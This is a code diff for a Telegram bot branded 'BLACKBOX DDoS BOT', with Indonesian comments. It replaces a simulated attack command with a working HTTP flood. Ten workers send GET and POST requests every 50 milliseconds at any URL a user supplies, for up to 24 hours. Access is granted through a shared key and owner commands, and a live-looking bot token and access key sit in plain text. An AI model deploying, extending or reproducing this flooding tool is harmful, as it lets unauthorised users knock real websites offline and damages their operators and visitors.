@@ -1,330 +1,421 @@
-const express = require('express');
-const TelegramBot = require('node-telegram-bot-api');
+import fetch from 'node-fetch'
 
-const app = express();
-app.use(express.json());
+// ===== CONFIG =====
+const BOT_TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc'
+const OWNER_ID = 6629230649
+const ACCESS_KEY = '123RJhTtApALhaT'
 
-// ==== CONFIG ====
-const TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc';
-const OWNER_ID = 6629230649;
-const ACCESS_KEY = '123RJhTtApALhaT';
+// ===== STATE =====
+const users = new Set([OWNER_ID])
+const attacks = new Map()
+const userData = new Map() // Simpan data user
 
-// ==== SIMPLE BOT SETUP ====
-console.log('🚀 Starting bot...');
-const bot = new TelegramBot(TOKEN, { polling: true });
-
-console.log('✅ Bot initialized');
-console.log('👤 Owner ID:', OWNER_ID);
-
-// ==== SIMPLE STORAGE ====
-let authorizedUsers = [OWNER_ID];
-let attacks = {};
-
-// ==== SIMPLE COMMANDS ====
-bot.on('message', (msg) => {
-  console.log(`📩 From ${msg.from.id}: ${msg.text}`);
-});
-
-bot.onText(/\/start/, (msg) => {
-  const userId = msg.from.id;
-  const isAuthorized = authorizedUsers.includes(userId);
-  
-  let response = `🤖 BLACKBOX BOT\n`;
-  response += `Your ID: ${userId}\n`;
-  response += `Status: ${isAuthorized ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n\n`;
-  
-  if (userId === OWNER_ID) {
-    response += `👑 OWNER COMMANDS:\n`;
-    response += `/ping - Test bot\n`;
-    response += `/attack url seconds - Start attack\n`;
-    response += `/stop id - Stop attack\n`;
-    response += `/adduser id - Add user\n`;
-    response += `/users - List users\n`;
-  } else if (isAuthorized) {
-    response += `✅ USER COMMANDS:\n`;
-    response += `/ping - Test bot\n`;
-    response += `/attack url seconds - Start attack\n`;
-    response += `/stop id - Stop attack\n`;
-  } else {
-    response += `🔐 Use /key ${ACCESS_KEY} to unlock`;
-  }
-  
-  bot.sendMessage(msg.chat.id, response);
-});
-
-bot.onText(/\/ping/, (msg) => {
-  bot.sendMessage(msg.chat.id, '🏓 PONG! Bot is working!');
-});
-
-bot.onText(/\/key (.+)/, (msg, match) => {
-  const userId = msg.from.id;
-  const inputKey = match[1];
-  
-  if (userId === OWNER_ID) {
-    bot.sendMessage(msg.chat.id, '👑 Owner tidak perlu key');
-    return;
-  }
-  
-  if (inputKey === ACCESS_KEY) {
-    if (!authorizedUsers.includes(userId)) {
-      authorizedUsers.push(userId);
-    }
-    bot.sendMessage(msg.chat.id, `✅ UNLOCKED! Now you can use /attack`);
-  } else {
-    bot.sendMessage(msg.chat.id, '❌ Wrong key');
-  }
-});
-
-bot.onText(/\/attack (.+?) (\d+)/, (msg, match) => {
-  const userId = msg.from.id;
-  
-  if (!authorizedUsers.includes(userId) && userId !== OWNER_ID) {
-    bot.sendMessage(msg.chat.id, '❌ Not authorized. Use /key first');
-    return;
-  }
-  
-  const url = match[1];
-  const seconds = parseInt(match[2]);
-  
-  if (!url.startsWith('http')) {
-    bot.sendMessage(msg.chat.id, '❌ Invalid URL. Use http:// or https://');
-    return;
-  }
-  
-  if (seconds < 1 || seconds > 300) {
-    bot.sendMessage(msg.chat.id, '❌ Duration: 1-300 seconds');
-    return;
-  }
-  
-  const attackId = Math.random().toString(36).substring(2, 6);
-  
-  bot.sendMessage(msg.chat.id,
-    `🚀 ATTACK STARTED\n` +
-    `ID: ${attackId}\n` +
-    `Target: ${url}\n` +
-    `Duration: ${seconds}s\n\n` +
-    `Will auto-stop after ${seconds} seconds`
-  );
-  
-  // Simulate attack (simple timeout)
-  attacks[attackId] = {
-    timer: setTimeout(() => {
-      delete attacks[attackId];
-      bot.sendMessage(msg.chat.id, `✅ Attack ${attackId} finished`);
-    }, seconds * 1000),
-    userId: userId,
-    chatId: msg.chat.id
-  };
-});
-
-bot.onText(/\/stop (.+)/, (msg, match) => {
-  const attackId = match[1];
-  const attack = attacks[attackId];
-  
-  if (!attack) {
-    bot.sendMessage(msg.chat.id, '❌ Attack not found');
-    return;
-  }
-  
-  if (attack.userId !== msg.from.id && msg.from.id !== OWNER_ID) {
-    bot.sendMessage(msg.chat.id, '❌ You can only stop your own attacks');
-    return;
-  }
-  
-  clearTimeout(attack.timer);
-  delete attacks[attackId];
-  bot.sendMessage(msg.chat.id, `🛑 Stopped attack ${attackId}`);
-});
-
-bot.onText(/\/adduser (\d+)/, (msg) => {
-  if (msg.from.id !== OWNER_ID) return;
-  
-  const newUserId = parseInt(msg.text.split(' ')[1]);
-  
-  if (!authorizedUsers.includes(newUserId)) {
-    authorizedUsers.push(newUserId);
-    bot.sendMessage(msg.chat.id, `✅ Added user ${newUserId}`);
-    
-    // Notify new user
-    bot.sendMessage(newUserId, `🎉 You've been added by owner!\nUse /start to see commands`);
-  } else {
-    bot.sendMessage(msg.chat.id, `⚠️ User ${newUserId} already added`);
-  }
-});
-
-bot.onText(/\/users/, (msg) => {
-  if (msg.from.id !== OWNER_ID) return;
-  
-  const userList = authorizedUsers.map(id => `• ${id}`).join('\n');
-  bot.sendMessage(msg.chat.id, `👥 AUTHORIZED USERS (${authorizedUsers.length}):\n${userList}`);
-});
-
-// ==== WEB INTERFACE ====
-app.get('/', (req, res) => {
-  res.send(`
-    <!DOCTYPE html>
-    <html>
-    <head>
-      <title>Simple Blackbox</title>
-      <meta name="viewport" content="width=device-width, initial-scale=1">
-      <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-          background: #0a0a0a;
-          color: #00ff00;
-          font-family: 'Courier New', monospace;
-          padding: 20px;
-          min-height: 100vh;
-        }
-        .container {
-          max-width: 600px;
-          margin: 0 auto;
-          border: 1px solid #00ff00;
-          padding: 20px;
-          border-radius: 5px;
-          background: rgba(0, 255, 0, 0.05);
-        }
-        h1 {
-          color: #00ff00;
-          margin-bottom: 20px;
-          text-align: center;
-        }
-        .status {
-          background: rgba(0, 255, 0, 0.1);
-          padding: 15px;
-          border-radius: 5px;
-          margin: 15px 0;
-          border-left: 3px solid #00ff00;
-        }
-        .status-title {
-          color: #00ff00;
-          font-size: 14px;
-          opacity: 0.8;
-        }
-        .status-value {
-          color: #00ff00;
-          font-size: 18px;
-          font-weight: bold;
-          margin-top: 5px;
-        }
-        .online {
-          color: #00ff00;
-          animation: blink 1s infinite;
-        }
-        @keyframes blink {
-          0%, 100% { opacity: 1; }
-          50% { opacity: 0.5; }
-        }
-        .commands {
-          margin-top: 25px;
-          padding: 15px;
-          background: rgba(0, 255, 0, 0.05);
-          border-radius: 5px;
-        }
-        .command {
-          margin: 8px 0;
-          padding-left: 10px;
-          border-left: 2px solid #00ff00;
-        }
-        footer {
-          margin-top: 25px;
-          text-align: center;
-          color: #008800;
-          font-size: 12px;
-          opacity: 0.7;
-        }
-      </style>
-    </head>
-    <body>
-      <div class="container">
-        <h1>⚡ SIMPLE BLACKBOX</h1>
-        
-        <div class="status">
-          <div class="status-title">SYSTEM STATUS</div>
-          <div class="status-value online">● ONLINE</div>
-        </div>
-        
-        <div class="status">
-          <div class="status-title">AUTHORIZED USERS</div>
-          <div class="status-value">${authorizedUsers.length}</div>
-        </div>
-        
-        <div class="status">
-          <div class="status-title">ACTIVE ATTACKS</div>
-          <div class="status-value">${Object.keys(attacks).length}</div>
-        </div>
-        
-        <div class="status">
-          <div class="status-title">OWNER ID</div>
-          <div class="status-value">${OWNER_ID}</div>
-        </div>
-        
-        <div class="commands">
-          <div style="color: #00ff00; margin-bottom: 10px;">📌 BOT COMMANDS:</div>
-          <div class="command">/start - Show menu</div>
-          <div class="command">/ping - Test response</div>
-          <div class="command">/key [key] - Register user</div>
-          <div class="command">/attack [url] [seconds] - Start attack</div>
-          <div class="command">/stop [id] - Stop attack</div>
-          ${msg.from && msg.from.id === OWNER_ID ? 
-            `<div class="command">/adduser [id] - Add user (Owner only)</div>
-             <div class="command">/users - List users (Owner only)</div>` : ''}
-        </div>
-        
-        <footer>
-          Simple Blackbox © ${new Date().getFullYear()}<br>
-          Uptime: ${Math.floor(process.uptime() / 60)} minutes
-        </footer>
-      </div>
-      
-      <script>
-        // Auto-refresh every 30 seconds
-        setTimeout(() => {
-          location.reload();
-        }, 30000);
-      </script>
-    </body>
-    </html>
-  `);
-});
-
-// ==== HEALTH CHECK ====
-app.get('/health', (req, res) => {
-  res.json({
-    status: 'ok',
-    bot: 'running',
-    users: authorizedUsers.length,
-    attacks: Object.keys(attacks).length,
-    uptime: process.uptime()
-  });
-});
-
-// ==== START SERVER ====
-const PORT = process.env.PORT || 3000;
-
-app.listen(PORT, () => {
-  console.log(`
-  ╔══════════════════════════════════╗
-  ║     SIMPLE BLACKBOX ACTIVE       ║
-  ╠══════════════════════════════════╣
-  ║  Port: ${PORT}                    ║
-  ║  Owner: ${OWNER_ID}               ║
-  ║  Key: ${ACCESS_KEY}               ║
-  ╚══════════════════════════════════╝
-  `);
-  
-  // Test bot connection
-  bot.getMe()
-    .then(me => {
-      console.log(`✅ Bot connected: @${me.username}`);
-      console.log(`✅ Send /ping to test`);
+// ===== HELPER FUNCTIONS =====
+async function sendTG(chatId, text) {
+  try {
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ 
+        chat_id: chatId, 
+        text,
+        parse_mode: 'HTML'
+      })
     })
-    .catch(err => {
-      console.log('❌ Bot connection error:', err.message);
-    });
-});
+  } catch(e) {}
+}
 
-// ==== KEEP ALIVE ====
-setInterval(() => {
-  console.log(`[${new Date().toLocaleTimeString()}] Status: ${Object.keys(attacks).length} attacks`);
-}, 60000);
+async function saveUser(userId, userInfo) {
+  userData.set(userId, {
+    first_name: userInfo.first_name || '',
+    username: userInfo.username || '',
+    joined: new Date().toISOString()
+  })
+}
+
+async function startDDoS(target, seconds, chatId, attackId, method = 'MIX') {
+  const startTime = Date.now()
+  const endTime = startTime + (seconds * 1000)
+  let requestCount = 0
+  
+  // Methods
+  const methods = {
+    'HTTP': () => fetch(target, { method: 'GET', signal: AbortSignal.timeout(2000) }),
+    'POST': () => fetch(target, { 
+      method: 'POST', 
+      body: JSON.stringify({ flood: Date.now() }),
+      signal: AbortSignal.timeout(2000)
+    }),
+    'RANDOM': () => fetch(target, { 
+      method: Math.random() > 0.5 ? 'GET' : 'POST',
+      signal: AbortSignal.timeout(2000)
+    })
+  }
+  
+  // Worker per method
+  let methodsToUse = []
+  if (method === 'MIX') methodsToUse = ['HTTP', 'POST', 'RANDOM']
+  else methodsToUse = [method]
+  
+  // Create multiple workers
+  const workers = []
+  for (let i = 0; i < 10; i++) {
+    const worker = setInterval(async () => {
+      if (Date.now() > endTime) {
+        clearInterval(worker)
+        return
+      }
+      
+      try {
+        const selectedMethod = methodsToUse[Math.floor(Math.random() * methodsToUse.length)]
+        await methods[selectedMethod]().catch(() => {})
+        requestCount++
+      } catch(e) {}
+    }, 50) // 50ms interval
+    
+    workers.push(worker)
+  }
+  
+  attacks.set(attackId, {
+    workers,
+    chatId,
+    target,
+    method,
+    startTime,
+    requestCount: 0
+  })
+  
+  // Update counter
+  const counter = setInterval(() => {
+    const attack = attacks.get(attackId)
+    if (attack) attack.requestCount = requestCount
+  }, 1000)
+  
+  // Auto stop
+  setTimeout(() => {
+    const attack = attacks.get(attackId)
+    if (attack) {
+      attack.workers.forEach(w => clearInterval(w))
+      clearInterval(counter)
+      attacks.delete(attackId)
+      
+      const duration = (Date.now() - attack.startTime) / 1000
+      sendTG(chatId,
+        `✅ ATTACK FINISHED\n\n` +
+        `ID: <code>${attackId}</code>\n` +
+        `Target: ${target}\n` +
+        `Duration: ${duration.toFixed(1)}s\n` +
+        `Requests: ${requestCount}\n` +
+        `RPS: ${(requestCount/duration).toFixed(1)}`
+      )
+    }
+  }, seconds * 1000)
+}
+
+// ===== COMMAND HANDLERS =====
+async function handleCommand(chatId, text, chatType, from) {
+  const userId = from.id
+  const isOwner = userId === OWNER_ID
+  const isUser = users.has(userId)
+  
+  // Save user data
+  if (chatType === 'private') {
+    saveUser(userId, from)
+  }
+  
+  // ===== MENU & HELP =====
+  if (text === '/start') {
+    let menu = `⚡ <b>BLACKBOX DDoS BOT</b>\n`
+    menu += `┌─────────────────\n`
+    menu += `│ User ID: <code>${userId}</code>\n`
+    menu += `│ Status: ${isOwner ? '👑 OWNER' : isUser ? '✅ AUTHORIZED' : '🔒 LOCKED'}\n`
+    menu += `│ Users: ${users.size}\n`
+    menu += `│ Attacks: ${attacks.size}\n`
+    menu += `└─────────────────\n\n`
+    
+    menu += `<b>MAIN COMMANDS:</b>\n`
+    menu += `• /menu - Show this menu\n`
+    menu += `• /ping - Test response\n`
+    menu += `• /methods - Attack methods\n`
+    
+    if (isOwner || isUser) {
+      menu += `\n<b>ATTACK COMMANDS:</b>\n`
+      menu += `• /attack [url] [seconds] [method]\n`
+      menu += `• /stop [id]\n`
+      menu += `• /mystats - Your stats\n`
+    }
+    
+    if (!isOwner && !isUser) {
+      menu += `\n<b>ACCESS:</b>\n`
+      menu += `• /key ${ACCESS_KEY} - Unlock bot\n`
+    }
+    
+    if (isOwner) {
+      menu += `\n<b>OWNER COMMANDS:</b>\n`
+      menu += `• /users - List all users\n`
+      menu += `• /add [id] - Add user\n`
+      menu += `• /remove [id] - Remove user\n`
+      menu += `• /allattacks - Show all attacks\n`
+    }
+    
+    await sendTG(chatId, menu)
+  }
+  
+  else if (text === '/menu') {
+    await sendTG(chatId, '📋 Opening menu...')
+    handleCommand(chatId, '/start', chatType, from)
+  }
+  
+  else if (text === '/ping') {
+    const start = Date.now()
+    await sendTG(chatId, '🏓 Testing response...')
+    const latency = Date.now() - start
+    await sendTG(chatId, `⏱️ Response time: <code>${latency}ms</code>`)
+  }
+  
+  else if (text === '/methods') {
+    const methodsText = `⚡ <b>ATTACK METHODS</b>\n\n`
+      + `• <code>HTTP</code> - GET request flood\n`
+      + `• <code>POST</code> - POST data flood\n`
+      + `• <code>RANDOM</code> - Random methods\n`
+      + `• <code>MIX</code> - All methods (default)\n\n`
+      + `<b>Examples:</b>\n`
+      + `<code>/attack https://target.com 60 MIX</code>\n`
+      + `<code>/attack https://target.com 120 HTTP</code>\n`
+      + `<code>/attack https://target.com 300 POST</code>\n\n`
+      + `Max duration: 24 hours\nNo request limit`
+    
+    await sendTG(chatId, methodsText)
+  }
+  
+  else if (text.startsWith('/key')) {
+    const key = text.split(' ')[1]
+    
+    if (isOwner) {
+      await sendTG(chatId, '👑 Owner tidak perlu key')
+      return
+    }
+    
+    if (key === ACCESS_KEY) {
+      users.add(userId)
+      await sendTG(chatId, 
+        `✅ <b>ACCESS GRANTED!</b>\n\n` +
+        `User ID: <code>${userId}</code>\n` +
+        `Status: AUTHORIZED\n\n` +
+        `Now you can use:\n` +
+        `• /attack - Start DDoS\n` +
+        `• /stop - Stop attack\n` +
+        `• /mystats - Your stats`
+      )
+    } else {
+      await sendTG(chatId, '❌ Invalid access key')
+    }
+  }
+  
+  else if (text.startsWith('/attack')) {
+    if (!isOwner && !isUser) {
+      await sendTG(chatId, '❌ Not authorized\nUse /key first')
+      return
+    }
+    
+    const parts = text.split(' ')
+    if (parts.length < 3) {
+      await sendTG(chatId, '❌ Format: /attack [url] [seconds] [method]\nExample: /attack https://site.com 60 MIX')
+      return
+    }
+    
+    const url = parts[1]
+    const seconds = parseInt(parts[2])
+    const method = (parts[3] || 'MIX').toUpperCase()
+    
+    // Validasi
+    if (!url.startsWith('http')) {
+      await sendTG(chatId, '❌ Invalid URL\nUse http:// or https://')
+      return
+    }
+    
+    if (seconds < 1 || seconds > 86400) {
+      await sendTG(chatId, '❌ Duration: 1-86400 seconds (24 hours max)')
+      return
+    }
+    
+    const validMethods = ['HTTP', 'POST', 'RANDOM', 'MIX']
+    if (!validMethods.includes(method)) {
+      await sendTG(chatId, `❌ Invalid method\nUse: ${validMethods.join(', ')}`)
+      return
+    }
+    
+    const attackId = Math.random().toString(36).substring(2, 8).toUpperCase()
+    
+    await sendTG(chatId,
+      `🚀 <b>ATTACK LAUNCHED!</b>\n\n` +
+      `┌─────────────────\n` +
+      `│ ID: <code>${attackId}</code>\n` +
+      `│ Target: ${url}\n` +
+      `│ Duration: ${seconds}s\n` +
+      `│ Method: ${method}\n` +
+      `│ User: <code>${userId}</code>\n` +
+      `└─────────────────\n\n` +
+      `To stop: <code>/stop ${attackId}</code>`
+    )
+    
+    startDDoS(url, seconds, chatId, attackId, method)
+  }
+  
+  else if (text.startsWith('/stop')) {
+    const attackId = text.split(' ')[1]?.toUpperCase()
+    
+    if (!attackId) {
+      await sendTG(chatId, '❌ Format: /stop [attack_id]')
+      return
+    }
+    
+    const attack = attacks.get(attackId)
+    if (!attack) {
+      await sendTG(chatId, '❌ Attack not found')
+      return
+    }
+    
+    if (attack.chatId !== chatId && !isOwner) {
+      await sendTG(chatId, '❌ You can only stop your own attacks')
+      return
+    }
+    
+    attack.workers.forEach(w => clearInterval(w))
+    attacks.delete(attackId)
+    
+    const duration = (Date.now() - attack.startTime) / 1000
+    await sendTG(chatId,
+      `🛑 <b>ATTACK STOPPED</b>\n\n` +
+      `ID: <code>${attackId}</code>\n` +
+      `Duration: ${duration.toFixed(1)}s\n` +
+      `Target: ${attack.target}\n` +
+      `Method: ${attack.method}`
+    )
+  }
+  
+  else if (text === '/mystats') {
+    if (!isOwner && !isUser) {
+      await sendTG(chatId, '❌ Not authorized')
+      return
+    }
+    
+    const userAttacks = Array.from(attacks.entries())
+      .filter(([id, attack]) => attack.chatId === chatId)
+    
+    const userInfo = userData.get(userId) || {}
+    
+    let stats = `📊 <b>YOUR STATS</b>\n`
+    stats += `┌─────────────────\n`
+    stats += `│ ID: <code>${userId}</code>\n`
+    stats += `│ Name: ${userInfo.first_name || 'N/A'}\n`
+    stats += `│ Username: @${userInfo.username || 'N/A'}\n`
+    stats += `│ Joined: ${userInfo.joined ? new Date(userInfo.joined).toLocaleDateString() : 'N/A'}\n`
+    stats += `│ Active Attacks: ${userAttacks.length}\n`
+    stats += `└─────────────────\n\n`
+    
+    if (userAttacks.length > 0) {
+      stats += `<b>ACTIVE ATTACKS:</b>\n`
+      userAttacks.forEach(([id, attack]) => {
+        const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
+        stats += `• <code>${id}</code> - ${attack.target} (${duration}s)\n`
+      })
+    }
+    
+    await sendTG(chatId, stats)
+  }
+  
+  else if (text === '/users' && isOwner) {
+    let userList = `👥 <b>TOTAL USERS: ${users.size}</b>\n\n`
+    
+    Array.from(users).forEach((id, index) => {
+      const info = userData.get(id) || {}
+      const name = info.first_name ? `- ${info.first_name}` : ''
+      const username = info.username ? `@${info.username}` : ''
+      userList += `${index + 1}. <code>${id}</code> ${name} ${username}\n`
+    })
+    
+    await sendTG(chatId, userList)
+  }
+  
+  else if (text.startsWith('/add') && isOwner) {
+    const newId = parseInt(text.split(' ')[1])
+    if (newId) {
+      users.add(newId)
+      await sendTG(chatId, `✅ Added user <code>${newId}</code>`)
+      await sendTG(newId, '🎉 You have been added by owner!\nUse /start to begin')
+    }
+  }
+  
+  else if (text.startsWith('/remove') && isOwner) {
+    const removeId = parseInt(text.split(' ')[1])
+    if (removeId) {
+      users.delete(removeId)
+      await sendTG(chatId, `❌ Removed user <code>${removeId}</code>`)
+    }
+  }
+  
+  else if (text === '/allattacks' && isOwner) {
+    if (attacks.size === 0) {
+      await sendTG(chatId, '📭 No active attacks')
+      return
+    }
+    
+    let attackList = `⚡ <b>ACTIVE ATTACKS: ${attacks.size}</b>\n\n`
+    
+    attacks.forEach((attack, id) => {
+      const duration = ((Date.now() - attack.startTime) / 1000).toFixed(0)
+      attackList += `• <code>${id}</code>\n`
+      attackList += `  Target: ${attack.target}\n`
+      attackList += `  Duration: ${duration}s\n`
+      attackList += `  Method: ${attack.method}\n`
+      attackList += `  User: <code>${attack.chatId}</code>\n`
+      attackList += `  Stop: <code>/stop ${id}</code>\n\n`
+    })
+    
+    await sendTG(chatId, attackList)
+  }
+  
+  else {
+    // Unknown command
+    await sendTG(chatId, '❌ Unknown command\nUse /start for menu')
+  }
+}
+
+// ===== MAIN HANDLER =====
+export default async function handler(req, res) {
+  // GET untuk test
+  if (req.method === 'GET') {
+    return res.status(200).json({ 
+      status: 'BLACKBOX ACTIVE',
+      owner: OWNER_ID,
+      users: users.size,
+      attacks: attacks.size,
+      uptime: process.uptime()
+    })
+  }
+  
+  // POST dari Telegram Webhook
+  if (req.method === 'POST') {
+    try {
+      const update = req.body
+      
+      if (update.message) {
+        const chatId = update.message.chat.id
+        const text = update.message.text || ''
+        const from = update.message.from || {}
+        const chatType = update.message.chat.type
+        
+        // Process command
+        await handleCommand(chatId, text, chatType, from)
+      }
+      
+      return res.status(200).json({ ok: true })
+    } catch (error) {
+      console.log('Handler error:', error)
+      return res.status(200).json({ ok: true }) // Tetap return 200 ke Telegram
+    }
+  }
+  
+  return res.status(405).json({ error: 'Method not allowed' })
+  }
